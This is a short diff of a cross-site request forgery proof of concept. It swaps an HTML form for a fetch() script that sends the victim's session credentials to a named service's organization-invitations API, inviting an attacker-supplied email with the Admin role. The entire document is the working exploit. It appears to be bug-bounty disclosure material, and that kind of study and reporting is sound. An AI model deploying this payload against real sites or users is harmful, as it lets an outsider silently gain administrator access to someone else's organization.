@@ -1,11 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="POST" action="https://console.chainstack.com/api/core/v1/organization-invitations/">
-			<input type="hidden" name="email" value="yaacoubel63@gmail.com">
-			<input type="hidden" name="user_group" value="Admin">
-			<input type="submit" value="Submit Request">
-		</form>
-	</body>
-</html>
+<script>
+				fetch("https://console.chainstack.com/api/core/v1/organization-invitations/", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "email=test2@gmail.com&user_group=Admin"
+})
+			</script>
+	
